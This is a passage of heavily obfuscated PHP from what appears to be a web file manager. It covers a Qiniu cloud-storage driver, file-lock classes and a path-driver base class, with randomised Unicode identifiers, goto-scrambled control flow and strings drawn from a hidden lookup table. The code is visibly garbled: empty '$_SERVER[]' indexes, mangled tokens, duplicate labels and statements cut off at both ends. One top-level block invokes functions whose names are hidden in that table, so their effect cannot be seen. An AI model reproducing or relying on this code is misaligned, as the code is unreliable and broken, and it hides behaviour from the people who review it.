$Bʡվ, !0); return $E ? !1 : $this->getPathOuter($Bʡվ); } public function delFile($E) { if (!$this->exist($E)) { return !0; } $A֝ = $this->bucketManager->delete($this->bucket, $E); return $A֝ ? !1 : !0; } public function delFolder($F̬) { goto Cϩ; c: $a = $this->fileList($F̬); $this->listItemCache = !0; $d = trim($F̬, $C[8]) . $C[8]; goto B; d߼̪: return $this->delByBatch($a[$C[74]]); goto dق; Cϩ: $C =& $_SERVER[]; if (!$this->exist($F̬)) { return !0; } $this->listItemCache = !1; goto c; B: if (!empty($F̬) && !in_array($d, $a[$C[74]])) { $a[$C[74]][] = $d; } $b騩ɂ = $this->delByBatch($a[$C[73]]); if (!$b騩ɂ) { return !1; } goto d߼̪; dق: } private function delByBatch($eߎ) { foreach (array_chunk($eߎ, 1000) as $cЇ) { $d۱ˡ = $this->bucketManager->buildBatchDelete($this->bucket, $cЇ); list($bМ, $B) = $this->bucketManager->batch($d۱ˡ); if ($B) { return !1; } } return !0; } public function rename($bٗ, $bÔ܅) { return $this->renameObject($bٗ, $bÔ܅); } public function fileInfo($fҿ, $eҌ = false, $E = array()) { goto e; e: $D =& $_SERVER[]; $EÆ = array($D[28] => $this->pathThis($fҿ), $D[75] => $this->getPathOuter($D[8] . $fҿ), $D[29] => $D[173], $D[77] => isset($E[$D[1300]]) ? $E[$D[1300]] : 0, $D[167] => $this->ext($fҿ)); if ($eҌ) { return $EÆ; } goto Dė; Dė: $EÆ[$D[192]] = $EÆ[$D[83]] = 0; $EÆ[$D[193]] = $EÆ[$D[194]] = !0; if (empty($E)) { $E = $this->objectMeta($fҿ); if (!$E) { return $EÆ; } } goto c델Í; c델Í: if (isset($E[$D[1301]])) { $EÆ[$D[83]] = substr($E[$D[1301]] . $D[33], 0, 10); } if (isset($E[$D[1300]])) { $EÆ[$D[77]] = $E[$D[1300]]; } return $EÆ; goto FӘ; FӘ: } public function folderInfo($f, $D = false) { goto A; A: $A[$D[192]] = $A[$D[83]] = 0; $A[$D[193]] = $A[$D[194]] = !0; $f = rtrim($f, $D[8]) . $D[8]; goto C͔; C͔: $aի = $this->objectMeta($f); if (isset($aի[$D[1301]])) { $A[$D[83]] = substr($aի[$D[1301]] . $D[33], 0, 10); } return $A; goto Bᛦ; A: $D =& $_SERVER[]; $A = array($D[28] => $this->pathThis($f), $D[75] => $this->getPathOuter($D[8] . $f), $D[29] => $D[76]); if ($D) { return $A; } goto A; Bᛦ: } public function listPath($aȬ, $aϠ = false) { $Fר =& $_SERVER[]; $c = $this->fileList($aȬ, $Fר[8], !0); foreach ($c[$Fר[74]] as $b䢗 => $B) { $c[$Fר[74]][$b䢗] = $this->folderInfo($B, $aϠ); } foreach ($c[$Fר[73]] as $b䢗 => $B) { $c[$Fר[73]][$b䢗] = $this->fileInfo($B[$Fר[92]], $aϠ, $B); } return $c; } public function has($cіè, $Eܛ = false, $Aț = true) { goto BѶˌ; BѶˌ: $d =& $_SERVER[]; $cіè = trim($cіè, $d[8]); $a = empty($cіè) ? $d[33] : $cіè . $d[8]; goto b҄; f: return !1; goto fӛ; F񵬓: $E = $e͘ = 0; while (!0) { check_abort(); list($B, $a) = $this->bucketManager->listFiles($this->bucket, $a, $dٿ, $Bݳ, $E); if ($a) { break; } $dٿ = array_key_exists($d[1270], $B) ? $dٿ = $B[$d[1302]] : $d[33]; if ($Eܛ) { if (!empty($B[$d[1303]])) { $E += count($B[$d[1303]]); } if (!empty($B[$d[1304]])) { $e͘ += count($B[$d[1304]]); } if ($dٿ === $d[33]) { break; } continue; } if ($Aț) { if (!empty($B[$d[1303]])) { return !0; } } else { if (!empty($B[$d[1304]])) { return !0; } } if ($dٿ === $d[33]) { break; } } if ($Eܛ) { return array($d[201] => $E, $d[202] => $e͘); } goto f; b҄: $dٿ = $d[33]; $Bݳ = 500; $E = $d[8]; goto F񵬓; fӛ: } public function listAll($eĄ) { $cŞ =& $_SERVER[]; $Cӑʣ = $this->fileList($eĄ, $cŞ[33], !0); $fތ = array(); foreach ($Cӑʣ[$cŞ[73]] as $e뱹) { $fތ[$e뱹[$cŞ[92]]] = $e뱹[$cŞ[77]]; } foreach ($Cӑʣ[$cŞ[74]] as $e뱹) { if (is_string($e뱹)) { $fތ[$e뱹] = 0; } } return $this->listAllFiles($eĄ, array_keys($fތ), $fތ); } private function fileList($a, $e姹 = '', $d = 0) { goto D; C: $Eȕۄ = $A̭[33]; $aנޭ = 1000; $Bڎލ = $this->listItemCache === !1 ? !1 : !0; goto cܟč; A: return array($A̭[74] => $CͶ, $A̭[73] => $aߙ); goto Eζ; cܟč: $CͶ = $aߙ = array(); while (!0) { check_abort(); list($F܋ė, $cѿ) = $this->bucketManager->listFiles($this->bucket, $b, $Eȕۄ, $aנޭ, $e姹); if ($cѿ) { break; } $Eȕۄ = array_key_exists($A̭[1270], $F܋ė) ? $Eȕۄ = $F܋ė[$A̭[1302]] : $A̭[33]; $C܏ = isset($F܋ė[$A̭[1303]]) ? $F܋ė[$A̭[1303]] : array(); $c = isset($F܋ė[$A̭[1304]]) ? $F܋ė[$A̭[1304]] : array(); foreach ($C܏ as $FȻ) { goto E; Dﻦݖ: if ($F五) { $CͶ[] = $C; continue; } $aߙ[] = $d ? $FȻ : $C; goto cǂ; Eþ: $FȻ[$A̭[77]] = $d񥰝; $F五 = $d񥰝 == 0 && substr($C, strlen($C) - 1, 1) == $A̭[8] ? !0 : !1; if ($Bڎލ) { $this->cacheMethod($A̭[197], $C, $F五); $this->cacheMethod($A̭[198], $C, $FȻ); } goto Dﻦݖ; E: if ($FȻ[$A̭[92]] == $b) { continue; } $C = $FȻ[$A̭[92]]; $d񥰝 = $FȻ[$A̭[1300]]; goto Eþ; cǂ: } foreach ($c as $C) { if ($C == $b) { continue; } $CͶ[] = $C; if ($Bڎލ) { $this->cacheMethod($A̭[197], $C, !0); } } if ($Eȕۄ === $A̭[33]) { break; } } if ($Bڎލ) { $this->cacheMethod($A̭[197], $a, !0); } goto A; D: $A̭ =& $_SERVER[]; $a = trim($a, $A̭[8]); $b = empty($a) ? $A̭[33] : $a . $A̭[8]; goto C; Eζ: } public function canRead($DŊ) { return $this->exist($DŊ) ? !0 : !1; } public function canWrite($EȦӤ) { return $this->exist($EȦӤ) ? !0 : !1; } public function getContent($cĖ) { return $this->fileSubstr($cĖ, 0, -1); } public function setContent($cǊ, $Cؿ = '') { $C = $this->tempFile($this->pathThis($cǊ)); file_put_contents($C, $Cؿ); if ($this->upload($cǊ, $C)) { $this->tempFileRemve($C); return !0; } return !1; } public function refreshUrls($B֍) { goto C؟κ; cԯ: return $e[$e[1077]] == $e[732] ? !0 : !1; goto c޾; C؟κ: $e =& $_SERVER[]; $Aň = array(); if (is_array($B֍)) { foreach ($B֍ as $Cǵ) { $Aň[] = $this->link($Cǵ); } } else { $Aň[] = $this->link($B֍); } goto B; B: $Fٖ = new Qiniu\Cdn\CdnManager($this->auth); list($e, $Bǫ) = $Fٖ->refreshUrls($Aň); if ($Bǫ) { return !1; } goto cԯ; c޾: } public function fileSubstr($F, $D, $AՎ) { $C =& $_SERVER[]; if (!($D = $this->link($F))) { return !1; } $DϘ = !1; if ($AՎ > 0) { $eÉ = $D + $AՎ - 1; $DϘ = array($C[1305] . $D . $C[434] . $eÉ); } $b褠 = url_request($D, $C[226], !1, $DϘ); return $b褠[$C[725]] ? $b褠[$C[1087]] : !1; } public function upload($Eނՙߏ, $E񈉰, $D = false, $Fչ = REPEAT_REPLACE) { $e덷 = new Qiniu\Storage\UploadManager(); $D؇ = $this->auth->uploadToken($this->bucket, $Eނՙߏ); $Bբω = get_file_mime(get_path_ext($E񈉰)); list($dߦ, $e׍Է) = $e덷->putFile($D؇, $Eނՙߏ, $E񈉰, null, $Bբω); return $e׍Է ? !1 : $this->getPathOuter($Eނՙߏ); } public function uploadFormData($Aی, $D = 3600) { return $this->uploadToken($Aی, $D); } public function multiUploadFormData($f驋, $CѬ = 3600) { return $this->uploadToken($f驋, $CѬ); } private function uploadToken($bý, $dϙ = 3600) { goto Cٰ̜; Cٰ̜: $dŹ郍 =& $_SERVER[]; $bƔ = $dϙ; $Aò = array($dŹ郍[1306] => $dŹ郍[1307]); goto Bߡ; fŜ̌: $D = http_type() . "\x3a\x2f\x2f\x75\160\x6c\x6f\x61\x64{$f՞}\x2e\x71\151\156\151\165\160\56\x63\x6f\x6d\57"; return array($dŹ郍[1309] => $bÐұ, $dŹ郍[1310] => $D); goto A; Bߡ: $Aќ = $bý; $bÐұ = $this->auth->uploadToken($this->bucket, $Aќ, $bƔ, $Aò, !0); $f՞ = empty($this->region) || $this->region == $dŹ郍[1308] ? $dŹ郍[33] : $dŹ郍[434] . $this->region; goto fŜ̌; A: } public function download($A݂, $Dӧ؋) { goto Cňӹ; eצآ: fclose($cƥ); return $Dӧ؋; goto f̓; E: $b򍼬 = 1024 * 200; $cƥ = fopen($a, $_SERVER[][1311]); while (!0) { $b = $this->fileSubstr($A݂, $ē, $b򍼬); if ($b === !1) { return !1; } fwrite($cƥ, $b); $ē += $b򍼬; if (strlen($b) < $b򍼬) { break; } } goto eצآ; Cňӹ: $a = IO::getPathInner(IO::mkfile($Dӧ؋)); if (!($CЏ = $this->link($A݂))) { return !1; } $ē = 0; goto E; f̓: } public function link($d貙, $BԺѣ = '') { if (!$this->isFile($d貙)) { return !1; } $fͅ = $this->getHost() . $_SERVER[][8] . $this->pathEncode($d貙) . $BԺѣ; return $this->auth->privateDownloadUrl($fͅ, 3600 * 12); } public function fileOut($a, $d͑ = false, $bы = false, $c͢ = '') { $Bل =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($a, $d͑, $bы, $c͢); } if (!$bы) { $bы = $this->pathThis($a); } $a߅̲ = $d͑ ? $Bل[1312] . rawurlencode($bы) : $Bل[33]; $B粉ه = $this->link($a, $a߅̲); $this->fileOutLink($B粉ه); } public function fileOutServer($e, $e򛞯 = false, $cӐ = false, $a = '') { parent::fileOut($e, $e򛞯, $cӐ, $a); } public function fileOutImage($FЍ, $E = 250) { $fى = $this->link($FЍ, $_SERVER[][1313] . $E); $this->fileOutLink($fى); } public function fileOutImageServer($eӡ, $a喦 = 250) { parent::fileOutImage($eӡ, $a喦); } public function hashMd5($B) { $Fͽī =& $_SERVER[]; $F殰 = $this->objectMeta($B); return isset($F殰[$Fͽī[206]]) ? $F殰[$Fͽī[206]] : !1; $e = $this->link($B, $Fͽī[1314]); } public function size($C) { $fԉԂ = $this->objectMeta($C); return $fԉԂ ? $fԉԂ[$_SERVER[][77]] : 0; } public function info($Bʲ) { if ($this->isFolder($Bʲ)) { return $this->folderInfo($Bʲ); } else { if ($this->isFile($Bʲ)) { return $this->fileInfo($Bʲ); } } return !1; } public function exist($D) { return $this->isFile($D) || $this->isFolder($D); } public function isFile($dȠ) { return !$this->isFolder($dȠ) && $this->objectMeta($dȠ); } public function isFolder($D) { return $this->cacheMethod($_SERVER[][197], $D); } protected function objectMeta($B㜐) { return $this->cacheMethod($_SERVER[][198], $B㜐); } protected function _objectMeta($Aꨶ) { $bٽ =& $_SERVER[]; list($BԄ, $fĖ) = $this->bucketManager->stat($this->bucket, $Aꨶ); if ($BԄ) { $BԄ[$bٽ[77]] = intval($BԄ[$bٽ[1300]]); } return $BԄ; } protected function _isFolder($bʪ) { $c =& $_SERVER[]; if ($bʪ == $c[33] || $bʪ == $c[8]) { return !0; } list($eҮ, $Cᾈڎ) = $this->bucketManager->listFiles($this->bucket, trim($bʪ, $c[8]) . $c[8], $c[33], 1, $c[8]); return !empty($eҮ[$c[1303]]) || !empty($eҮ[$c[1304]]) ? !0 : !1; } } goto E˫; a: if ($_SERVER[$_SERVER[][794]] != $_SERVER[$_SERVER[][839]]) { goto Cą; Cą: $eꃉ = $_SERVER[][795]; $b낅 = $_SERVER[$_SERVER[][796]] . $_SERVER[][797]; $D눪 = $eꃉ($b낅); goto B; c: $FԖ($_SERVER[$_SERVER[][792]]); goto fҢۻ; B: $Dㅣ = explode($_SERVER[][227], $D눪); if (count($Dㅣ) < $_SERVER[][583]) { $Fʈ = $_SERVER[][798]; $Fʈ(); } $FԖ = $_SERVER[][799]; goto c; fҢۻ: } goto bś; eܪ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto AՍ; cꌷ: self::$timeout = $e֍[$D俿[813]] ? $e֍[$D俿[813]] : 10; $Bቃݦ = _get($GLOBALS[$D俿[6]], $D俿[814]); $DÛ = $e֍[$D俿[800]] ? $e֍[$D俿[800]] : $D俿[173]; goto b߉; AՍ: $D俿 =& $_SERVER[]; if (self::$handle) { return self::$handle; } $e֍ = $GLOBALS[$D俿[6]][$D俿[345]]; goto cꌷ; b߉: if ($DÛ == $D俿[17] && $Bቃݦ == $D俿[9]) { $DÛ = $D俿[173]; } switch ($DÛ) { case $D俿[803]: self::$handle = new CacheLockRedis(); break; case $D俿[804]: self::$handle = new CacheLockMemcached(); break; case $D俿[17]: self::$handle = new CacheLockDatabase(); break; case $D俿[173]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto fӽ; fӽ: } private static function key($eڿ) { return $_SERVER[][815] . Cache::key($eڿ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($C = '') { self::$errorMsg = $C; } public static function lockGlobal($eĉ, $E) { return self::lock($eĉ, $E, !0); } public static function lock($C¿ʐ, $a = false, $BԖ = false) { goto bӹ; bӹ: $F񑰨 =& $_SERVER[]; $b硆 = self::init(); $cܡᬟ = self::key($C¿ʐ); goto bȆЅ; Aー: if (!$BԖ) { self::$lockItem[$cܡᬟ] = !0; } return $eݡٚ; goto d; bȆЅ: $a = $a ? $a : self::$timeout; $eݡٚ = $b硆->lock($cܡᬟ, $a); if (!$eݡٚ) { $Fà = "\154\157\x63\153\x20\145\x72\162\157\162\73\x6b\x65\x79\75{$C¿ʐ}\73\164\151\155\x65\x3d{$a}\x3b" . self::$errorMsg . $F񑰨[67] . get_caller_msg(); $d͙ = LNG($F񑰨[816]) . "\50{$a}\163\51\56" . LNG($F񑰨[817]); $d͙ .= $F񑰨[818]; if (is_string(self::$errorMsg) && self::$errorMsg) { $d͙ = $d͙ . $F񑰨[819] . self::$errorMsg; } write_log($Fà, $F񑰨[820]); show_json($d͙, !1); } goto Aー; d: } public static function lockGet($E) { $E𿂷 = self::key($E); if (self::$lockItem[$E𿂷]) { return self::$lockItem[$E𿂷]; } return self::init()->lockGet($E𿂷); } public static function unlock($D펶) { $F٤҇ײ = self::key($D펶); self::$lockItem[$F٤҇ײ] = null; return self::init()->unlock($F٤҇ײ); } public static function unlockRuntime() { $Dٹ =& $_SERVER[]; $eِ = self::init(); $bф˫ = !1; foreach (self::$lockItem as $Eע => $aұ蒊) { if (!$aұ蒊) { continue; } $eِ->unlock($Eע); if (!$bф˫) { $bф˫ = !0; write_log($Dٹ[821] . $Eע . $Dٹ[67] . get_caller_msg(), $Dٹ[820]); continue; } write_log($Dٹ[821] . $Eע, $Dٹ[820]); } self::fileUnlockAll(); } public static function fileLock($C׺⧵) { goto B۽; B۽: $BΗ֌ =& $_SERVER[]; if (!$GLOBALS[$BΗ֌[822]]) { $GLOBALS[$BΗ֌[822]] = array(); } $GLOBALS[$BΗ֌[822]][$C׺⧵] = !1; goto c۹ฌ; E: return !1; goto c՝; c۹ฌ: $F = fopen(DATA_PATH . $C׺⧵ . $BΗ֌[823], $BΗ֌[824]); if (!$F) { return !1; } $GLOBALS[$BΗ֌[822]][$C׺⧵] = $F; goto Bא; Bא: if (flock($F, LOCK_EX)) { return !0; } self::unlock($C׺⧵); show_json($BΗ֌[825], !1); goto E; c՝: } public static function fileUnlock($A酓) { $e =& $_SERVER[]; $Fݹֵ = $GLOBALS[$e[822]][$A酓]; if (!$Fݹֵ) { return; } $GLOBALS[$e[822]][$A酓] = !1; flock($Fݹֵ, LOCK_UN); fclose($Fݹֵ); } public static function fileUnlockAll() { $Fϡ =& $_SERVER[]; if (!$GLOBALS[$Fϡ[822]]) { return; } foreach ($GLOBALS[$Fϡ[822]] as $dב => $C) { if (!$C) { continue; } $GLOBALS[$Fϡ[822]][$dב] = !1; flock($C, LOCK_UN); fclose($C); } $GLOBALS[$Fϡ[822]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $D膕 =& $_SERVER[]; $A = $GLOBALS[$D膕[6]][$D膕[345]]; self::$cachePath = $A[$D膕[173]][$D膕[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($dʍ, $Dկ컒 = 0) { goto F; aܘ: $this->unlock($dʍ); return !1; goto fҴ; F: $cϻ =& $_SERVER[]; $Eͱ޲ = microtime(!0); $A = $Eͱ޲ + $Dկ컒 + 0.0001; goto aҋ; aҋ: $B똥 = rtrim(self::$cachePath, $cϻ[8]) . $cϻ[826] . md5($dʍ) . $cϻ[823]; if (file_exists($B똥) && filemtime($B똥) && filemtime($B똥) < time() - 10) { @unlink($B똥); } do { if (file_exists($B똥)) { cacheLockWait(); continue; } $FΞ = fopen($B똥, $cϻ[827]); if (!$FΞ) { return !1; } $Dώ = flock($FΞ, LOCK_EX | LOCK_NB); self::$caches[$dʍ] = array($cϻ[828] => $FΞ, $cϻ[173] => $B똥); fwrite($FΞ, $A); clearstatcache(); if ($FΞ && $Dώ) { return !0; } cacheLockWait(); } while (microtime(!0) < $A); goto aܘ; fҴ: } public function lockGet($cґ) { $Aƅ =& $_SERVER[]; $b = rtrim(self::$cachePath, $Aƅ[8]) . $Aƅ[826] . md5($cґ) . $Aƅ[823]; return file_exists($b); } public function unlock($E嫹) { goto Bʘ籍; c̃: unset(self::$caches[$E嫹]); goto a; e㐈潒: @flock($Eڡ[$b[828]], LOCK_UN); @fclose($Eڡ[$b[828]]); @unlink($Eڡ[$b[173]]); goto c̃; Bʘ籍: $b =& $_SERVER[]; $Eڡ = self::$caches[$E嫹]; if (!$Eڡ) { return; } goto e㐈潒; a: } } goto eă; eƷ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $B׉ڃ =& $_SERVER[]; $this->objectDriver = array($B׉ڃ[57], $B׉ڃ[58], $B׉ڃ[59], $B׉ڃ[60], $B׉ڃ[61], $B׉ڃ[62], $B׉ڃ[63], $B׉ڃ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($D谤ɏ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($D谤ɏ, $_SERVER[][8]); } return $D谤ɏ; } public function iconvApp($cף) { return $cף; } public function iconvSystem($D󳢧) { return $D󳢧; } public function iconvTo($Bը, $Cݡ, $aé) { goto Fރ; EϯȌ: return $EƊҕ; goto c; dڃ: $dۨ✴[$aé . $b[66] . $Cݡ . $b[67] . $Bը] = $Bը; $dۨ✴[$aé . $b[66] . $Cݡ . $b[67] . $EƊҕ] = $Bը; $dۨ✴[$Cݡ . $b[66] . $aé . $b[67] . $EƊҕ] = $EƊҕ; goto EϯȌ; Fˡ: $b = $Cݡ . $b[66] . $aé . $b[67] . $Bը; if (isset($dۨ✴[$b])) { return $dۨ✴[$b]; } if (function_exists($b[68])) { $EƊҕ = @mb_convert_encoding($Bը, $aé, $Cݡ); } else { $EƊҕ = @iconv($Cݡ, $aé, $Bը); } goto fѾ; Fރ: $b =& $_SERVER[]; if (!$Bը || !function_exists($b[65])) { return $Bը; } static $dۨ✴ = array(); goto Fˡ; fѾ: $EƊҕ = $EƊҕ ? $EƊҕ : $Bը; if (strstr($EƊҕ, $b[69])) { $EƊҕ = str_replace($b[69], $b[70], $EƊҕ); } $dۨ✴[$Cݡ . $b[66] . $aé . $b[67] . $Bը] = $EƊҕ; goto dڃ; c: } public function getPathInner($d߷) { $C߇ = IO::init($d߷); return $C߇->path; } public function getPathOuter($bپ) { $cѱ =& $_SERVER[]; $e = strlen(trim($this->pathBase, $cѱ[8])); $bپ = substr(trim($bپ, $cѱ[8]), $e); return $this->pathDriver . $cѱ[8] . ltrim($bپ, $cѱ[8]); } public function isParentOf($C, $Fڭ) { $Cۂ۔ =& $_SERVER[]; $C = rtrim(strtolower($C), $Cۂ۔[8]) . $Cۂ۔[8]; $Fڭ = rtrim(strtolower($Fڭ), $Cۂ۔[8]) . $Cۂ۔[8]; $fެ = strpos($Fڭ, $C) === 0; return $fެ; } public function getType() { $aߞՇ͔ =& $_SERVER[]; $D = str_replace($aߞՇ͔[71], $aߞՇ͔[33], get_class($this)); return strtolower($D); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($cډ, $E󩍍) { $f䐔 =& $_SERVER[]; $Dڮ纛 = rtrim($cډ, $f䐔[8]) . $f䐔[8] . $E󩍍; $F = $this->exist($Dڮ纛); return $F ? $Dڮ纛 : !1; } public function setModifyTime($e͖, $d = '') { } public function renameObject($dɚ, $cהА) { goto C; C: $Fﭚ =& $_SERVER[]; $f = $cהА; Hook::trigger($Fﭚ[72], $this, $dɚ, $this, $this->pathFather($dɚ) . $cהА); goto a; a: $dɚ = $this->getPathOuter($dɚ); $cהА = $this->pathFather($dɚ) . $cהА; if (IO::isFile($dɚ)) { $a̒ѝ = IO::copy($dɚ, $this->pathFather($dɚ), REPEAT_RENAME_FOLDER, $f); if ($a̒ѝ) { IO::remove($dɚ); } } else { $a̒ѝ = IO::mkdir($cהА); if (!$a̒ѝ) { return !1; } $cۡ = IO::listPath($dɚ, !0); $E˘ = array_merge($cۡ[$Fﭚ[73]], $cۡ[$Fﭚ[74]]); foreach ($E˘ as $Dψ) { IO::move($Dψ[$Fﭚ[75]], $cהА, REPEAT_RENAME_FOLDER); } IO::remove($dɚ); } goto FȄ; FȄ: return $a̒ѝ ? $cהА : !1; goto D˝ī; D˝ī: } public function tempFile($Dם = '', $C֯ = '') { goto Dá̑; Dá̑: if (!$Dם) { $Dם = rand_string(15); } $BŇݸ = TEMP_FILES . rand_string(15) . $_SERVER[][8]; @mkdir($BŇݸ, 511, !0); goto cߥ; bݷ: return $e킃; goto aұ; cߥ: $e킃 = $BŇݸ . $Dם; @touch($e킃); if ($C֯) { file_put_contents($e킃, $C֯); } goto bݷ; aұ: } public function tempFileRemve($EꞚ) { @unlink($EꞚ); @rmdir($this->pathFather($EꞚ)); } public function mkfile($D⟅, $e໦ = '', $Dұ = REPEAT_RENAME) { } public function mkdir($aү, $Eؖᥨ = REPEAT_SKIP) { } public function delFile($c) { } public function delFolder($a͙) { } public function copyFile($F뢋፲, $e۲) { } public function moveFile($dɋ, $Fϲ׍) { } public function remove($c) { if ($this->isFile($c)) { return $this->delFile($c); } return $this->delFolder($c); } public function rename($bʷ, $a) { } public function exist($D) { } public function findByHash($A˅ء = '', $c㧚 = '') { return !1; } public function isFile($AǢ) { } public function isFolder($A) { } public function size($eҊ) { } public function info($f溅) { } public function infoSimple($aܛı) { return $this->info($aܛı); } public function infoAuth($C) { return $this->info($C); } public function infoFull($c) { return $this->info($c); } public function infoWithChildren($b򰂸) { $b؅ =& $_SERVER[]; static $eĘ = array(); if (isset($eĘ[$b򰂸])) { return $eĘ[$b򰂸]; } $a = $this->info($b򰂸); if ($a && $a[$b؅[29]] == $b؅[76]) { $bى = array($b؅[77] => 0, $b؅[78] => 0, $b؅[79] => 0); $this->infoChildren($b򰂸, $bى); $a[$b؅[77]] = $bى[$b؅[77]]; $a[$b؅[80]] = array($b؅[81] => $bى[$b؅[78]], $b؅[82] => $bى[$b؅[79]]); $eĘ[$b򰂸] = $a; } return $a; } public function listPath($B, $E = false) { } public function has($fת, $D񤹓 = false, $d = false) { } public function canRead($f) { } public function canWrite($bٚ) { } public function getContent($E뎭) { } public function setContent($f, $B߿ = '') { } protected function infoChildren($d朡, &$A) { $Dȅ =& $_SERVER[]; check_abort_echo(); $c = $this->listPath($d朡, !0); $c = array_merge($c[$Dȅ[74]], $c[$Dȅ[73]]); foreach ($c as $c) { if ($c[$Dȅ[29]] == $Dȅ[76]) { $A[$Dȅ[79]]++; $B = $this->getPathInner($c[$Dȅ[75]]); $this->infoChildren($B, $A); } else { $A[$Dȅ[78]]++; $A[$Dȅ[77]] += $c[$Dȅ[77]]; } } } public function fileSubstr($F, $bޞƃѐ, $DӲϲ) { } public function listAll($BҴ) { } public function listAllMake($E, &$d) { $e =& $_SERVER[]; check_abort_echo(); $f合 = $this->listPath($E, !0); if (!$f合) { return; } $B疄 = array_merge($f合[$e[74]], $f合[$e[73]]); foreach ($B疄 as $a֙) { goto e; e: $C۔ = $a֙[$e[29]] == $e[76]; $Ȇѧ = array($e[75] => $a֙[$e[75]], $e[76] => $C۔); if (isset($a֙[$e[77]])) { $Ȇѧ[$e[77]] = $a֙[$e[77]]; } goto Cș; Cș: if (isset($a֙[$e[83]])) { $Ȇѧ[$e[83]] = $a֙[$e[83]]; } if (!$C۔) { $d[] = $Ȇѧ; continue; } $d[] = $Ȇѧ; goto cř܎; cř܎: $this->listAllMake($a֙[$e[75]], $d); goto eʑ; eʑ: } } public function listAllSimple($f즄) { $aǎ =& $_SERVER[]; $c = array(); $eƅ = $this->listAll($f즄); $E = $this->getPathOuter($f즄); foreach ($eƅ as $D؎ꪄ) { goto fÞ⼼; fÞ⼼: $C糾 = $D؎ꪄ[$aǎ[75]]; $F˕ = $D؎ꪄ[$aǎ[75]]; if (isset($D؎ꪄ[$aǎ[84]])) { $C糾 = $D؎ꪄ[$aǎ[84]][$aǎ[75]]; $D؎ꪄ[$aǎ[77]] = $D؎ꪄ[$aǎ[84]][$aǎ[77]]; $D؎ꪄ[$aǎ[83]] = $D؎ꪄ[$aǎ[84]][$aǎ[83]]; } else { $F˕ = substr($D؎ꪄ[$aǎ[75]], strlen(get_path_father($E))); $F˕ = $aǎ[8] . ltrim($F˕, $aǎ[8]); } goto F; Cֆ: if (!$D؎ꪄ[$aǎ[76]]) { $Cÿ;[$aǎ[85]] = $C糾; } $c[] = $Cÿ;; goto cϏ; F: $Cÿ; = array($aǎ[75] => $F˕, $aǎ[76] => $D؎ꪄ[$aǎ[76]]); if (isset($D؎ꪄ[$aǎ[77]]) && !$D؎ꪄ[$aǎ[76]]) { $Cÿ;[$aǎ[77]] = $D؎ꪄ[$aǎ[77]]; } if (isset($D؎ꪄ[$aǎ[83]])) { $Cÿ;[$aǎ[83]] = $D؎ꪄ[$aǎ[83]]; } goto Cֆ; cϏ: } return $c; } public function upload($D䇈, $Cܘ, $e녓 = false, $c = REPEAT_REPLACE) { } public function uploadFileByID($fС, $cཡ, $f׼) { } public function uploadFileByPath($e˗, $Aľ, $Bݦ = array()) { } public function isUploadServer() { $DՏ׼ =& $_SERVER[]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $DՏ׼[86]) { return !0; } return $GLOBALS[$DՏ׼[6]][$DՏ׼[87]][$DՏ׼[88]]; } public function isFileOutServer() { $B↷ =& $_SERVER[]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $B↷[86]) { return !0; } return $GLOBALS[$B↷[6]][$B↷[87]][$B↷[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($a֏) { $d =& $_SERVER[]; if (!$this->isCdnHost()) { return $a֏; } return str_replace(trim(get_url_root($a֏), $d[8]), trim($this->cdnHost, $d[8]), $a֏); } public function uploadLink($e, $Cϫ = 0) { goto B; B: $E =& $_SERVER[]; if ($this->isUploadServer()) { return; } $D = $this->getType(); goto B˟; Aΐѯ: $aѡ = $Cϫ <= $fĴ֯ώ ? $E[90] : $E[91]; $EՍ = (!$Cϫ ? 1 : ceil($Cϫ / pow(1024, 3))) * 3600 * 4; $eɫĥ = $this->{$aѡ}($e, $EՍ); goto cݓ̣; B˟: if (!in_array($D, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $fĴ֯ώ = 1024 * 1024 * 10; goto Aΐѯ; cݓ̣: if ($eɫĥ) { $eɫĥ[$E[92]] = $e; $eɫĥ[$E[93]] = $D; } return $eɫĥ; goto c堍ü; c堍ü: } public function uploadFormData($A܏ǣ, $E = 3600) { } public function multiUploadFormData($D, $Bڳ = 3600) { } public function download($B͆Ђ, $E˳) { } public function ext($Cח) { $D鴋 =& $_SERVER[]; if (strpos($Cח, $D鴋[8]) === -1) { $c݅ն = $Cח; } else { $c݅ն = $this->pathThis($Cח); } $Cڬ = $D鴋[33]; if (strstr($c݅ն, $D鴋[94])) { $Cڬ = substr($c݅ն, strrpos($c݅ն, $D鴋[94]) + 1); $Cڬ = strtolower($Cڬ); } if (strlen($Cڬ) > 3 && preg_match($D鴋[95], $Cڬ, $FՐ)) { $Cڬ = $D鴋[33]; } return $Cڬ; } public function pathThis($cʼӳ) { $Cę =& $_SERVER[]; $cʼӳ = str_replace($Cę[96], $Cę[8], rtrim($cʼӳ, $Cę[8])); $e뽒颅 = strrpos($cʼӳ, $Cę[8]); if ($e뽒颅 === !1) { return $cʼӳ; } return substr($cʼӳ, $e뽒颅 + 1); } public function pathFather($A) { $D =& $_SERVER[]; $A = str_replace($D[96], $D[8], rtrim($A, $D[8])); $A捋 = strrpos($A, $D[8]); if ($A捋 === !1) { return $D[33]; } return substr($A, 0, $A捋 + 1); } public function hashSimple($D᪓) { goto D˿; e: $c = 200; $cꥯ = 50; if ($D <= $c * $cꥯ) { return $this->hashMd5($D᪓) . $D; } goto CÇ; AҐ碸: $DÑ .= $this->fileSubstr($D᪓, $D - $c, $c); return md5($DÑ) . $D; goto eŖ; CÇ: $A󥷶 = intval($D / $cꥯ); $DÑ = $d٘䅉[33]; for ($Fި = 0; $Fި < $cꥯ; $Fި++) { $DÑ .= $this->fileSubstr($D᪓, $A󥷶 * $Fި, $c); } goto 